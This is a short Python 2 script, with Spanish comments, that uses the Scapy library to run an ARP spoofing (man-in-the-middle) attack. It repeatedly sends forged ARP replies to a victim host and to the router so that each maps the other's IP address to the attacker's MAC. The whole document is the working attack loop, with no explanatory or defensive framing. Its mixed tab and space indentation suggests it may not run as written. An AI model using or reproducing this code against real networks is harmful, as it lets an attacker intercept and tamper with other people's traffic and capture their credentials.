from scapy.all import *
 

def spoofVictim(macVictim, ipVictim, ipRouterToSpoof, ourMac):
	print "[+] Creating packet %d and sending to VICTIM..." % count
        srp1(Ether(dst=macVictim)/ARP(pdst=ipVictim, psrc=ipRouterToSpoof, hwsrc=ourMac), timeout=2, verbose = 0)
 
def spoofRouter(macRouter, ipRouter, ipVictimToSpoof, ourMac):
	print "[+] Creating packet %d and sending to ROUTER..." % count
        srp1(Ether(dst=macRouter)/ARP(pdst=ipRouter, psrc=ipVictimToSpoof, hwsrc=ourMac), timeout=2, verbose = 0)
 
 
count = 1
 
# Datos spoof victima
ipVictim = "192.168.0.2"
macVictim = getmacbyip(ipVictim)
ipRouterToSpoof = "192.168.0.1"
ourMac = "02:fd:00:00:01:01"
 
# Datos spoof router
ipRouter = "192.168.0.1"
macRouter = getmacbyip(ipRouter)
ipVictimToSpoof = "192.168.0.2"
ourMac = "02:fd:00:00:01:01"
 

 
while True:
    spoofVictim(macVictim, ipVictim, ipRouterToSpoof, ourMac)
    spoofRouter(macRouter, ipRouter, ipVictimToSpoof, ourMac)
    count += 1
